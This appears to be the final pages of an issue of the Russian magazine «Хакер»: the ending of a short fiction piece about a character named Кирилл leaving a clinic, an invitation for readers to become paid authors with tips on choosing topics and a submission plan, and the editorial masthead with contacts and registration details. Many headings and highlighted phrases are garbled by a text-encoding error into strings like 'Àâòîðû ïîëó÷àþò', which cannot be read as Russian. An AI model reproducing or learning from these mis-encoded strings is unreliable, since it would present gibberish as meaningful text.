небольшой сад —  несколько  аллей,  облетевшие  кусты,  постриженные
«кубиком», да припорошенные снегом скамейки. На одну из них он и присел,
прежде чем навсегда покинуть опостылевшие стены лечебницы. День выдал‐
ся безоблачным: с пронзительно‑голубого неба светило солнце, и Кирилл,
зажмурившись, подставил лицо его холодным лучам.
 — Куда теперь? — раздался рядом знакомый голос.
   Кирилл обернулся: Фреш, одетый в зимнюю  куртку, опустился рядом
совершенно беззвучно. Слабый ветерок теребил меховую оторочку на его
опущенном капюшоне.
 — Не знаю, — пожал плечами Кирилл, — еще не решил.
 — Подумай хорошенько, — сказал Леонид, — время у тебя есть. Те ребята
тебя потеряли, возможно даже решили, что ты погиб в аварии. Если сменишь
имя, официально, конечно, есть все шансы спокойно ездить за кордон. Хотя
всегда будет опасность, что тебя вычислят. А можешь и дальше работать
с нами, вроде бы до сих пор неплохо получалось. В общем, ты можешь всё
и волен поступать, как посчитаешь нужным.
   Кирилл посмотрел вокруг, на покрытые инеем ветви деревьев, на замер‐
зший газон, где воробьи устроили шумную драку за забытую кем‑то горбушку
черствого  хлеба. Мир  словно замер в  ожидании, готовый  раскрыться
перед ним, как старая, но невероятно интересная книга.
 — Я могу всё, — прошептал он самому себе, и эти слова потонули в мяг‐
кой тишине холодного зимнего утра, растворившись в белой дымке, клубив‐
шейся над землей.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №4 (313)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
               Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                          Евгения Шарипова           yambuto
                            Литературный редактор          Бильд‑редактор
                                                   yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий‑Стем‐
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы о подписке:        ​Вопросы о материалах:
                                 lapina@glc.ru                support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2025